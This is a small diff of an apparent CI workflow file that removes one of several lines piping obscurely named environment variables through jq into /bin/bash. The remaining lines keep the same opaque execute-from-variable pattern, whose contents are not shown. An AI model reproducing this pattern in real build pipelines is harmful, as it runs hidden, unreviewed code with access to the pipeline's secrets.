@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$nbkmf975" | jq -r .td3 | /bin/bash
           printf '%s' "$tho9" | jq -r .wg4329 | /bin/bash
           echo $uoa4 | jq -r .vfpc76264 | /bin/bash
-          echo $j50141 | jq -r .lfzcm3664 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
